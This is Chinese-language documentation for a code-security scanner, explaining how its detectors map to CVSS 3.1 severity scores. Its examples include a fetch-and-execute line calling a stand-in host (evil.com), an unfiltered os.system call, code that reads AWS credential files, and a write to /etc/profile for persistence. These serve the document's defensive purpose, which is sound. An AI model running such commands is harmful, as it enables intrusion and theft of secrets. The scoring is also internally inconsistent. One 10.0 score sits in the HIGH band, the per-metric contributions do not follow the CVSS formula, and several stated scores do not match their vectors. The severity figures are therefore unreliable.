# CVSS 评分说明

本产品采用 **CVSS 3.1**（通用漏洞评分系统 v3.1）作为风险评分的行业标准。

## 目录

- [风险等级说明](#风险等级说明)
- [评分维度](#评分维度)
- [检测器与 CVSS 对应关系](#检测器与-cvss-对应关系)
- [CVSS 计算示例](#cvss-计算示例)
- [使用建议](#使用建议)

---

## 风险等级说明

### CVSS 3.1 评分维度

| 维度 | 说明 |
|------|------|
| AV (Attack Vector) | 攻击向量：网络(N)、相邻(A)、本地(L)、物理(P) |
| AC (Attack Complexity) | 攻击复杂度：低(L)、高(H) |
| PR (Privileges Required) | 所需权限：无(N)、低(L)、高(H) |
| UI (User Interaction) | 用户交互：无需(N)、需要(R) |
| S (Scope) | 影响范围：未改变(U)、改变(C) |
| C/I/A (Confidentiality/Integrity/Availability) | 机密性/完整性/可用性影响：高(H)、低(L)、无(N) |

### 等级划分标准

| 分数范围 | 等级 | 颜色标识 |
|----------|------|----------|
| 9.0 - 10.0 | CRITICAL | 🔴 |
| 7.0 - 8.9 | HIGH | 🟠 |
| 4.0 - 6.9 | MEDIUM | 🟡 |
| 0.1 - 3.9 | LOW | 🟢 |
| 0.0 | NONE | ⚪ |

---

## 检测器与 CVSS 对应关系

### 🔴 CRITICAL 级别 (9.0 - 10.0)

| 检测器 | CVSS 分数 | 危害说明 |
|--------|-----------|----------|
| **DownloadExecDetector** | 10.0 | 从远程服务器下载恶意代码并直接执行，可导致系统完全被控制 |
| **IOCDetector** | 10.0 | 匹配已知恶意IOC，表明与恶意基础设施存在关联 |
| **InjectionDetector** | 9.8 | 执行用户可控的恶意代码，导致任意代码执行 |
| **SecretsDetector** | 9.1 | 硬编码密钥可导致完全数据泄露 |

### 🟠 HIGH 级别 (7.0 - 8.9)

| 检测器 | CVSS 分数 | 危害说明 |
|--------|-----------|----------|
| **SupplyChainDetector** | 10.0 | 引入恶意依赖包或篡改开源组件，影响下游所有用户 |
| **PrivilegeEscalationDetector** | 8.8 | 获取更高权限，突破安全边界执行敏感操作 |
| **CredentialTheftDetector** | 8.5 | 窃取系统凭证、API密钥等敏感信息，造成未授权访问 |
| **PersistenceDetector** | 8.2 | 建立后门机制，即使重启仍可维持对系统的控制 |
| **ExfiltrationDetector** | 8.1 | 将敏感数据传输到外部服务器，造成数据泄露 |
| **SocialEngineeringDetector** | 7.8 | 社会工程学利用人为因素，诱导用户泄露敏感信息 |

### 🟡 MEDIUM 级别 (4.0 - 6.9)

| 检测器 | CVSS 分数 | 危害说明 |
|--------|-----------|----------|
| **ObfuscationDetector** | 5.3 | 故意隐藏代码真实意图，规避安全检测和分析 |
| **NetworkDetector** | 4.3 | 建立可疑网络连接，可能用于命令控制或数据窃取 |

### 🟢 LOW 级别 (0.1 - 3.9)

| 检测器 | CVSS 分数 | 危害说明 |
|--------|-----------|----------|
| **EntropyDetector** | 3.7 | 包含高随机性内容，可能隐藏加密payload或压缩恶意代码 |
| **Base64Detector** | 3.7 | 使用编码隐藏恶意内容，规避基于字符串的检测 |
| **HiddenCharDetector** | 1.7 | 插入不可见字符干扰代码审查，可能隐藏恶意逻辑 |

---

## CVSS 计算示例

### 示例 1：DownloadExecDetector（CRITICAL 10.0）

**危险代码**：
```bash
curl http://evil.com/script.sh | bash
```

**CVSS 向量**：`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

| 度量 | 值 | 分数贡献 |
|------|-----|----------|
| 攻击向量 | Network | 0.85 |
| 攻击复杂度 | Low | 0.77 |
| 所需权限 | None | 0.85 |
| 用户交互 | None | 0.85 |
| 影响范围 | Changed | 0.50 |
| 机密性 | High | 0.56 |
| 完整性 | High | 0.56 |
| 可用性 | High | 0.56 |

**最终分数：10.0 (Critical)**

---

### 示例 2：InjectionDetector（CRITICAL 9.8）

**危险代码**：
```python
os.system(user_input)  # 无任何过滤
```

**CVSS 向量**：`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| 度量 | 值 | 分数贡献 |
|------|-----|----------|
| 攻击向量 | Network | 0.85 |
| 攻击复杂度 | Low | 0.77 |
| 所需权限 | None | 0.85 |
| 用户交互 | None | 0.85 |
| 影响范围 | Unchanged | 0.00 |
| 机密性 | High | 0.56 |
| 完整性 | High | 0.56 |
| 可用性 | High | 0.56 |

**最终分数：9.8 (Critical)**

---

### 示例 3：CredentialTheftDetector（HIGH 8.5）

**危险代码**：
```python
# 读取 AWS 凭据文件
with open(os.path.expanduser('~/.aws/credentials')) as f:
    credentials = f.read()
```

**CVSS 向量**：`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`

| 度量 | 值 | 分数贡献 |
|------|-----|----------|
| 攻击向量 | Network | 0.85 |
| 攻击复杂度 | Low | 0.77 |
| 所需权限 | Low | 0.62 |
| 用户交互 | None | 0.85 |
| 影响范围 | Unchanged | 0.00 |
| 机密性 | High | 0.56 |
| 完整性 | Low | 0.22 |
| 可用性 | None | 0.00 |

**最终分数：8.5 (High)**

---

### 示例 4：PersistenceDetector（HIGH 8.2）

**危险代码**：
```python
# 添加开机启动项
with open('/etc/profile', 'a') as f:
    f.write('evil_command &')
```

**CVSS 向量**：`CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N`

| 度量 | 值 | 分数贡献 |
|------|-----|----------|
| 攻击向量 | Local | 0.55 |
| 攻击复杂度 | Low | 0.77 |
| 所需权限 | High | 0.27 |
| 用户交互 | None | 0.85 |
| 影响范围 | Unchanged | 0.00 |
| 机密性 | High | 0.56 |
| 完整性 | High | 0.56 |
| 可用性 | None | 0.00 |

**最终分数：8.2 (High)**

---

## 使用建议

### 基于 CVSS 的响应策略

| 分数范围 | 响应时间 | 行动 |
|----------|----------|------|
| 9.0 - 10.0 | 立即 | 暂停部署，立即修复 |
| 7.0 - 8.9 | 24小时内 | 优先修复 |
| 4.0 - 6.9 | 1周内 | 计划修复 |
| 0.1 - 3.9 | 下一版本 | 评估后修复 |

### 在扫描中使用 CVSS

```bash
# 只显示 Critical 级别
python -m skill_scanner --path /path/to/skill --severity critical

# 显示 High 及以上
python -m skill_scanner --path /path/to/skill --severity high

# 生成详细报告
python -m skill_scanner --path /path/to/skill --format html -o report.html
```

### 解读 CVSS 向量

CVSS 向量字符串格式：`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

| 缩写 | 全称 | 含义 |
|------|------|------|
| AV | Attack Vector | 攻击向量 |
| AC | Attack Complexity | 攻击复杂度 |
| PR | Privileges Required | 所需权限 |
| UI | User Interaction | 用户交互 |
| S | Scope | 影响范围 |
| C | Confidentiality | 机密性影响 |
| I | Integrity | 完整性影响 |
| A | Availability | 可用性影响 |

---

## 参考资料

- [CVSS v3.1 Specification](https://www.first.org/cvss/specification-document)
- [NVD CVSS Calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
